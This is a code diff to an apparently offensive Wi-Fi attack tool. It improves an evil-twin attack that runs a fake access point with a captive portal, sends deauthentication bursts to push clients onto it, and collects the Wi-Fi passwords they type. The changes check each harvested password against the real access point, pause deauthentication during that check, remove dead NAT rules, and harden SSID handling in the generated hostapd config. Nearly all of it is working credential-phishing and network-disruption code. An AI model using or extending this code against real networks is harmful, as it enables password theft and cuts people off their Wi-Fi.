@@ -78,11 +78,21 @@ class OweDowngradeResult:
 
 # ── config builders ──────────────────────────────────────────────────────────
 
+def _hostapd_ssid_line(ssid: str) -> str:
+    """SSID as hostapd's `ssid2=` hex form instead of the plain-text
+    `ssid=` directive. ssid= interpolates the raw bytes into the config,
+    so an SSID containing a newline, '#', or leading space corrupts the
+    file -- or injects extra config lines (it's attacker-visible data
+    from a beacon, not trusted input). ssid2= takes the SSID as hex
+    digits, which can express any byte sequence and nothing else."""
+    return f"ssid2={ssid.encode('utf-8', errors='surrogateescape').hex()}"
+
+
 def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
     return textwrap.dedent(f"""\
         interface={iface}
         driver=nl80211
-        ssid={ssid}
+        {_hostapd_ssid_line(ssid)}
         hw_mode=g
         channel={channel if channel <= 13 else 6}
         ignore_broadcast_ssid=0
@@ -105,7 +115,7 @@ def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> 
     return textwrap.dedent(f"""\
         interface={iface}
         driver=nl80211
-        ssid={ssid}
+        {_hostapd_ssid_line(ssid)}
         hw_mode=g
         channel={channel if channel <= 13 else 6}
         ignore_broadcast_ssid=0
@@ -195,8 +205,14 @@ _PORTAL_SUCCESS_HTML = """\
 """
 
 
-def _make_portal_handler(ssid: str, result_box: list):
-    """Return a handler class wired to result_box[0] for the harvested password."""
+def _make_portal_handler(ssid: str, result_box: list, verify_fn=None):
+    """Return a handler class wired to result_box[0] for the harvested password.
+
+    verify_fn: optional callable(password) -> bool run against the REAL
+    target AP before a submission is accepted. Without it a typo'd
+    submission would end the attack as a false success (the original
+    behavior); with it, rejected submissions just re-serve the portal so
+    the victim can retry."""
 
     class _Handler(BaseHTTPRequestHandler):
         def log_message(self, fmt, *args):
@@ -220,6 +236,14 @@ def _make_portal_handler(ssid: str, result_box: list):
             params = parse_qs(body)
             pwd = params.get("pwd", [""])[0].strip()
             if pwd and not result_box:
+                if verify_fn is not None:
+                    try:
+                        accepted = bool(verify_fn(pwd))
+                    except Exception:  # noqa: BLE001 - a verification error must not kill the portal
+                        accepted = False
+                    if not accepted:
+                        self._send(200, _PORTAL_HTML.format(ssid=ssid))
+                        return
                 result_box.append(pwd)
             self._send(200, _PORTAL_SUCCESS_HTML)
 
@@ -260,20 +284,6 @@ def _flush_ip(iface: str) -> None:
     _run(["ip", "addr", "flush", "dev", iface])
 
 
-def _iptables_nat_add(iface_ap: str, iface_mon: str) -> None:
-    _run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
-    _run(["iptables", "-A", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
-    _run(["iptables", "-A", "FORWARD", "-i", iface_mon, "-o", iface_ap,
-          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
-
-
-def _iptables_nat_remove(iface_ap: str, iface_mon: str) -> None:
-    _run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
-    _run(["iptables", "-D", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
-    _run(["iptables", "-D", "FORWARD", "-i", iface_mon, "-o", iface_ap,
-          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
-
-
 def _station_dump(iface: str) -> list[str]:
     """MACs of stations currently associated to iface in AP mode, via
     `iw dev <iface> station dump`. Used by run_owe_downgrade() as the
@@ -296,6 +306,7 @@ def run_eviltwin(
     timeout: float = 120.0,
     stop_event: threading.Event | None = None,
     progress_fn=None,
+    verify_password: bool = True,
 ) -> EvilTwinResult:
     """Launch the full evil-twin chain and wait for a password submission.
 
@@ -316,6 +327,12 @@ def run_eviltwin(
             dnsmasq/portal launch, each deauth round) -- previously this
             attack gave zero feedback until it fully succeeded or timed
             out, minutes later.
+        verify_password: Verify each portal submission against the REAL AP
+            with one live 4-way handshake (attacks/online.py's oracle)
+            before accepting it -- a typo'd password must not end the
+            attack as a false success. The deauth loop pauses during each
+            verification: it shares iface_mon, and its bursts would kill
+            the verification's own association attempt.
     """
     log = progress_fn or (lambda msg: None)
     stop = stop_event or threading.Event()
@@ -341,7 +358,6 @@ def run_eviltwin(
             except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                 pass
         _flush_ip(iface_ap)
-        _iptables_nat_remove(iface_ap, iface_mon)
 
     try:
         # ── 1. assign IP to AP interface ──────────────────────────────────
@@ -364,7 +380,6 @@ def run_eviltwin(
         tmpfiles.append(dconf.name)
 
         # ── 3. launch hostapd ─────────────────────────────────────────────
-        # ⚠️ CHECKPOINT: driver risk here — mt76x0u can freeze on AP mode.
         log(f"starting hostapd on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
         hostapd_proc = _popen(["hostapd", hconf.name])
         procs.append(hostapd_proc)
@@ -381,13 +396,31 @@ def run_eviltwin(
         time.sleep(_DNSMASQ_START_WAIT)
         log("dnsmasq up")
 
-        # ── 5. iptables NAT (optional — lets clients reach portal) ────────
-        _iptables_nat_add(iface_ap, iface_mon)
-        log("NAT rules added")
+        # (No iptables NAT here: it used to MASQUERADE out iface_mon, a
+        # monitor-mode interface with no IP stack -- dead rules that could
+        # never give clients connectivity. Clients reach the portal directly
+        # via iface_ap's own address, which is all this attack needs.)
 
-        # ── 6. captive portal HTTP server (background thread) ─────────────
+        # ── 5. captive portal HTTP server (background thread) ─────────────
         result_box: list[str] = []
-        handler = _make_portal_handler(ssid, result_box)
+        verify_active = threading.Event()
+        verify_fn = None
+        if verify_password:
+            from ..radio import get_mac
+            from .online import _try_password
+
+            attacker_mac = get_mac(iface_mon)
+
+            def verify_fn(pwd: str) -> bool:  # noqa: F811 - intentional None-or-callable pattern
+                verify_active.set()
+                try:
+                    ok, detail = _try_password(iface_mon, bssid, attacker_mac, ssid, pwd, 5.0)
+                finally:
+                    verify_active.clear()
+                log(f"portal submission {'VERIFIED' if ok else 'REJECTED'} against the real AP ({detail})")
+                return ok
+
+        handler = _make_portal_handler(ssid, result_box, verify_fn)
         server = HTTPServer((_AP_IP, _PORTAL_PORT), handler)
         server.timeout = 1.0
         servers.append(server)
@@ -404,6 +437,12 @@ def run_eviltwin(
         def _deauth_loop():
             round_n = 0
             while not stop.is_set() and not result_box:
+                if verify_active.is_set():
+                    # A portal submission is being verified against the real
+                    # AP right now -- our deauth bursts would kill that
+                    # association attempt (same iface_mon). Pause, not exit.
+                    stop.wait(1.0)
+                    continue
                 round_n += 1
                 try:
                     sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
@@ -430,12 +469,13 @@ def run_eviltwin(
 
         if result_box:
             stop.set()
-            log(f"password captured after {elapsed:.0f}s")
+            how = "verified against the real AP" if verify_password else "unverified"
+            log(f"password captured after {elapsed:.0f}s ({how})")
             return EvilTwinResult(
                 success=True,
                 password=result_box[0],
                 elapsed=elapsed,
-                detail=f"password captured after {elapsed:.0f}s",
+                detail=f"password captured after {elapsed:.0f}s ({how})",
             )
         log("no password submitted" if not stop.is_set() else "stopped")
         return EvilTwinResult(
@@ -655,7 +695,6 @@ def run_owe_downgrade(
             except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                 pass
         _flush_ip(iface_ap)
-        _iptables_nat_remove(iface_ap, iface_mon)
 
     try:
         log(f"assigning IP to {iface_ap}")
@@ -689,9 +728,6 @@ def run_owe_downgrade(
         procs.append(dns_proc)
         time.sleep(_DNSMASQ_START_WAIT)
         log("dnsmasq up")
-
-        _iptables_nat_add(iface_ap, iface_mon)
-        log("NAT rules added")
 
         def _deauth_loop():
             round_n = 0
